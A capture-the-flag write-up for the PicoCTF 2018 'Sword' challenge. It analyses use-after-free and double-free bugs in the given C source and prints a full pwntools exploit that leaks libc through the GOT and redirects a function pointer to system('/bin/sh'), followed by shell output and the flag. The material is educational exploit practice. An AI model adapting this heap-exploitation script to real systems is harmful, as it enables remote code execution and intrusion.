## PicoCTF 2018 Sword - Points: 800 - (Solves: 90)

Can you spawn a shell and get the flag? Connect with nc 2018shell2.picoctf.com 43469. Source. libc.so.6

The source for this one was given, [sword.c](https://github.com/Mithreindeir/ctf-writeups/blob/master/pico-ctf2018/sword/sword.c)

The sword\_s struct has a function pointer in it:
```C
struct sword_s {
	int name_len;
	int weight;

	char *sword_name;
	void (*use_sword)(char *ptr);
	int is_hardened;
};
```

The function "equip\_sword" calls the swords function pointer with the argument of its name, also with a comment hinting that this is the right direction
```C
	/* Apparently there should be system('/bin/sh'). */
	(sword_lists[slot].sword->use_sword)(sword_lists[slot].sword->sword_name);

```

Looking at the reset of the source the free\_sword stands out:

```C
void free_sword() {
	int slot;
	printf("What's the index of the sword?\n");
	slot = get_int();
	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	sword_lists[slot].is_used = 0;
	char *name = sword_lists[slot].sword->sword_name;

	free(sword_lists[slot].sword);
	free(name);
}
```

The program does leaves the sword in the array. This isn't a double free, but leaves it open to a Use-After-Free (UAF).
While the sword array does have a variable that shows whether this is in use, the "equip\_sword" function doesn't check this.

Now looking at the harden function:
```C

void harden_sword() {
	int slot;
	printf("What's the index of the sword?\n");
	slot = get_int();
	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	if (sword_lists[slot].sword->is_hardened) {
		printf("This sword is already hardened!\n");
		return;
	}

	printf("What's the length of the sword name?\n");

	/* Get name_len. */
	int len = get_int();
	if (len < 0) {
		printf("Oh no there is a hacker!!!!\n");
		exit(-1);
	}

	if (len > MAX_SWORD_LEN) {
		printf("The name is too long.\n");
		free(sword_lists[slot].sword);
		return;
	}

	sword_lists[slot].sword->name_len = len;

	/* Get sword name. */
	sword_lists[slot].sword->sword_name = malloc(len + 1);

	if (!sword_lists[slot].sword->sword_name) {
	        puts("malloc() returned NULL. Out of Memory\n");
		exit(-1);
	}

	printf("Plz input the sword name.\n");

	char ch;
	int i;
	for (i = 0; (read(STDIN_FILENO, &ch, 1), ch) != '\n' &&
		i < len && ch != -1; i++) {
		sword_lists[slot].sword->sword_name[i] = ch;
	}
	sword_lists[slot].sword->sword_name[i] = '\x00';

	/* Get sword weight. */
	printf("What's the weight of the sword?\n");
	int weight = get_int();

	printf("OK....Plz wait for forging the sword..........\n");
	sleep((weight + 1) * 10000000);

	sword_lists[slot].sword->weight = weight;
	sword_lists[slot].sword->use_sword = hoo;
	sword_lists[slot].sword->is_hardened = 1;
}


```

Several things should be noted with this function.
First, this snippet introduces a double free vulnerability. It doesn't set the not\_in\_use variable either.
```C
	if (len > MAX_SWORD_LEN) {
		printf("The name is too long.\n");
		free(sword_lists[slot].sword);
		return;
	}

```

Also, the function let's us choose the size of the name as long as it's under MAX\_SWORD\_LEN. This will come in handy later.

The synthe\_sword function, has a comment saying it is vulnerable, but we can already do an exploit without it. (I think the comment was meant to confuse anyways):

With what we know already, it is possible for us to leak libc. Let's exploit the UAF vulnerability to leak the atoi got entry.
To do that, we can just allocate 2 swords, free one of them, then allocate the name for the 2nd one making sure the name's size is the same size as the chunk size of a sword.
First fit will give the 2nd sword's name the same chunk as the first sword, and we are free to overwrite it. We will overwrite the 1st sword's name with the atoi got entry to leak libc.

The struct of a sword is:
```
struct sword_s {
	int name_len;
	int weight;
	char *sword_name;
	void (*use_sword)(char *ptr);
	int is_hardened;
};
```

So we will set the name\_length to 8 so we can read 8 bytes from the got entry, set the weight to 0 because we don't need it, and overwrite the sword\_name with atoi@got.
It is easier to parse the name from the hoo function instead of from the show\_sword function (you can use ..... as a delimeter for parsing for hoo). So I also overwrote
the first swords function pointer to the hoo function for easy parsing.

I will give the full source at the end, but leak\_libc() just parses the hoo function output.
```python
	atoi_plt = struct.pack("L", 0x602078)
	hoo = struct.pack("L", 0x400b9d)
	A = alloc(p)
	B = alloc(p)
	fake_free(p, A) # uses the free in harden_sword() so the is_used stays set.
	harden(p, B, "24", "\x08"+"\x00"+atoi_plt+hoo)
	base = int(leak_libc(p, A), 16) - 0x36e80 # 0x36e80 is the offset between atoi and libc
	log.info("libc base: " + hex(base))
```

This gives us the output:
```
    I use sword \x80^\x85C\x97\x7f.....
[*] libc base: 0x7f974381f000
```

Now we have a leak, and we have arbitrary write to a function pointer, so the next step is pretty simple.
We have to redo step 1 but use rewrite a sword name to a pointer to "/bin/sh" and a swords function pointer to "system"
"/bin/sh" can be found in libc, I used radare2 to search for it, but you can use gdb, or almost any other disassembler/debugger/static analysis tool.
radare2 reported "/bin/sh" at offset 0x18cd57. system@got was at offset 0x45390.

Putting both parts together:

```python

#!/bin/python2
from pwn import *
import re
import binascii

context.terminal = ["termite", "-e"]

def alloc(p):
    p.clean()
    p.sendline("1")
    idx = p.recvline_contains("sword index is")
    idx = idx.split(' ')
    idx = idx[len(idx)-1]
    idx = idx.split('.')[0]
    log.info('Alloc\'d: ' + idx)
    return idx

def harden(p, i, length, name):
    p.clean()
    p.sendline("5")
    p.sendlineafter("What's the index of the sword?", i)
    p.sendlineafter("What's the length of the sword name?", length)
    p.sendlineafter("Plz input the sword name.", name)
    p.sendlineafter("What's the weight of the sword?", "-1")
    #p.recvline_contains("NEW sword")

def leak_libc(p, i):
    p.clean()
    p.sendline("6")
    p.sendlineafter("What's the index of the sword?", i)
    dat = p.recvuntil('.....')
    log.info(dat)
    name = dat[13:19]
    hname = binascii.hexlify(name[::-1])
    test = struct.unpack("L", name+"\x00\x00")
    libc = hex(int(test[0]))
    return libc

def use_func(p, i):
    p.clean()
    p.sendline("6")
    p.sendlineafter("What's the index of the sword?", i)

def free(p, i):
    p.clean()
    p.sendline("4")
    p.sendlineafter("What's the index of the sword?", i)
    log.info("Object: " + i + " is free and slot is open")

def fake_free(p, i):
    p.clean()
    p.sendline("5")
    p.sendlineafter("What's the index of the sword?", i)
    p.sendlineafter("What's the length of the sword name?", "300")
    log.info("Object: " + i + " is free")

def break_heap():
    p = remote('2018shell2.picoctf.com', 43469)
    ''' Methodology:
        1). Use after free overwrite A->name with got entry of atoi
        2). Read A->name for atoi@got
        3). Use atoi@got to get libc base to find system address
        4). UAF exploit with system address

    '''

    A = alloc(p)
    B = alloc(p)
    C = alloc(p)
    D = alloc(p)

    fake_free(p, A)
    atoi_plt = struct.pack("L", 0x602078)
    hoo = struct.pack("L", 0x400b9d)
    harden(p, B, "24", "\x08"+"\x00"*7+atoi_plt+hoo)

    base = int(leak_libc(p, A), 16) - 0x36e80
    sys = base + 0x45390
    sh = base + 0x18CD57
    log.info("libc base: " + hex(base))
    log.info("system@got: " + hex(sys))
    log.info("/bin/sh: " + hex(sh))
    fake_free(p, C)
    harden(p, D, "24", "\x07"+"\x00"*7+struct.pack("L", sh)+struct.pack("L", sys))
    use_func(p, C)
    #gdb.attach(target=p, exe="./sword")


    p.interactive()


break_heap()
```

Executing the exploit:
```bash
[+] Opening connection to 2018shell2.picoctf.com on port 43469: Done
[*] Alloc'd: 0
[*] Alloc'd: 1
[*] Alloc'd: 2
[*] Alloc'd: 3
[*] Object: 0 is free
[*]
    I use sword \x80\x9eT\x1e�.....
[*] libc base: 0x7fc11e513000
[*] system@got: 0x7fc11e558390
[*] /bin/sh: 0x7fc11e69fd57
[*] Object: 2 is free
[*] Switching to interactive mode

$ id
uid=1476(sword_0) gid=1477(sword_0) groups=1477(sword_0)
$ ls
flag.txt
libc.so.6
sword
sword.c
xinet_startup.sh
$ cat flag.txt
picoCTF{usE_aFt3R_fr3e_1s_aN_1ssu3_05365660}
$
[*] Closed connection to 2018shell2.picoctf.com port 43469
```
